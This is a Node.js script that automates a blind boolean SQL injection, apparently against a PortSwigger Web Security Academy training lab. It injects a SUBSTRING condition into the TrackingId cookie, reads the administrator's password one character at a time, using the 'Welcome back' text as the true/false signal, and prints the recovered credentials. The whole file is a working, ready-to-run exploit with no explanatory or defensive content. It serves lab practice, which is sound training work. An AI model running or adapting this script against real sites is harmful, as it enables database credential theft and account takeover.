import axios from "axios";

// edit TrackingId and session
const getModifiedCookie = (substrPosition, payload, trackingId, sessionId) => {
  return `TrackingId=${trackingId}' AND (SELECT SUBSTRING(password,${substrPosition},1) FROM users WHERE username='administrator')='${payload}; session=${sessionId}`;
};

const createUrl = (labId) => {
  return `https://${labId}.web-security-academy.net`;
};

const checkMatchedPayload = (data, positon, char) => {
  const searchString = "Welcome back";
  const index = data.indexOf(searchString);

  if (index !== -1) {
    console.log(`match found! @${positon}, value: ${char}`);
    return { positon, char };
  } else {
    console.log("no match found...");
    return "no match found...";
  }
};

const shortenHTML = (html) => {
  let lines = html.split("\n");
  let sliced = lines.slice(0, 50);
  return sliced.join("\n");
};

const makeReqWithDelay = async (labId, tId, sId, delay) => {
  let result = [];
  let payloads = "0123456789abcdefghijklmnopqrstuvwxyz".split("");
  const url = createUrl(labId);

  for (let substrPosition = 1; substrPosition <= 20; substrPosition++) {
    for (let j = 0; j < payloads.length; j++) {
      try {
        const response = await axios.get(url, {
          headers: {
            Cookie: getModifiedCookie(substrPosition, payloads[j], tId, sId),
          },
        });
        console.log(
          `Testing...: ${getModifiedCookie(
            substrPosition,
            payloads[j],
            tId,
            sId
          )}`
        );
        const matchResult = checkMatchedPayload(
          shortenHTML(response.data),
          substrPosition,
          payloads[j]
        );

        if (matchResult !== "no match found...") {
          result.push(matchResult);
          break;
        }
      } catch (error) {
        console.error(error);
      }
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }

  console.log(result);
  const password = result.map((x) => x.char).join("");
  console.log(`username: administrator | password: ${password}`);
};

console.log(process.argv.length);

if (process.argv.length <= 5) {
  console.error(
    "Error: Insufficient arguments. Usage: node script.js <lab_id> <tracking_id> <session_id> <requests_delay_ms>"
  );
  process.exit(1);
} else {
  makeReqWithDelay(
    process.argv[2],
    process.argv[3],
    process.argv[4],
    process.argv[5]
  );
}
